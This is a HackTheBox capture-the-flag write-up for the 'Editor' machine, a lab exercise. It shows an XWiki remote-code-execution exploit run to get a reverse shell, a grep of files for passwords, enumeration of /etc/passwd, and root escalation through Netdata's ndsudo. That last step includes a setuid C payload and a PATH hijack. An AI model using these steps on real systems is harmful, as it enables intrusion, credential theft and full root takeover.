# Description

Here I will share how I was able to solve the Editor machine which is an easy difficulty machine on [HackTheBox](https://Hackthebox.com)

# Solution
We're first provided with this IP 10.10.11.80 so I run an nmap 


![nmap scan](https://github.com/AmnesiacDev/Editor-HTB-Writeup/blob/main/nmap-result-screenshot.png)

We can see an interesting http port 8080, so we go to 10.10.11.80:8080 and we get to this website page

![xwiki_website](https://github.com/AmnesiacDev/Editor-HTB-Writeup/blob/main/xwiki_website.png)

if we scroll to the bottom we can see the version that was used

![xwiki_version](https://github.com/AmnesiacDev/Editor-HTB-Writeup/blob/main/xwiki_version.png)

After doing a bit of searching I found this vulnrability which works on this exact version of xwiki [CVE-2025-24893](https://github.com/D3Ext/CVE-2025-24893)

So I simply run the python payload, give it the IP of the website (10.10.11.80:8080), my IP and the port I'll be listening to 1337.
on a seperate terminal I run 



```bash
nesc101@Nesc:~$  nc -lvnp 1337         #listen on port 1337
```

and boom we get reverse shell

![reverse shell](https://github.com/AmnesiacDev/Editor-HTB-Writeup/blob/main/reverse_shell.png)

After doing some digging I run this 

```bash
$     grep -Rn "password" .          # search all files in all folders for "password"
```

I found an interesting password

![password](https://github.com/AmnesiacDev/Editor-HTB-Writeup/blob/main/password_found.png)

To find the user who this password belongs to I run this 

```bash
$     awk -F: '$3 >= 1000 {print $1}' /etc/passwd         #Show all human users 
nobody
oliver
```
We got "oliver" which seems like the one we want to check out, so I open a new terminal and connect using ssh 

```bash
$     ssh oliver@10.10.11.80         #Connect using the password we obtained
```

And here we find our first flag in user.txt

![flag-1](https://github.com/AmnesiacDev/Editor-HTB-Writeup/blob/main/first_flag.png)

But we're not done yet, we still are missing the root flag!
We already know that user **oliver** is in group **netdata** and after some enumeration we can do check out ndsudo
```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```
And here we can see that there's an executable called **megacli** that ndsudo is looking for in the $PATH and after doing some searchin online I come across this [CVE-2024-32019](https://github.com/AzureADTrent/CVE-2024-32019-POC/tree/main)

Now we follow the steps

## On our machine we make the megacli file with the content of poc.c


```bash
~/HackTheBoxMachines/Editor$  touch megacli.c     
~/HackTheBoxMachines/Editor$  nano megacli.c

#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}

~/HackTheBoxMachines/Editor$  gcc megacli.c -o megacli
~/HackTheBoxMachines/Editor$  scp megacli oliver@10.10.11.80:/home/pliver/tmp
```

Now that we have our payload on the target machine we can export it to $PATH

```bash
oliver@editor:~$  export PATH=~/tmp:$PATH
oliver@editor:~$  /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
root@editor:/home/oliver# id 
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
```

Now we can freely look for our flag and we find it in **/root/root.txt**

## Material
https://github.com/AzureADTrent/CVE-2024-32019-POC/tree/main

https://github.com/D3Ext/CVE-2025-24893

https://dudenation.github.io/posts/editor-htb-season8/


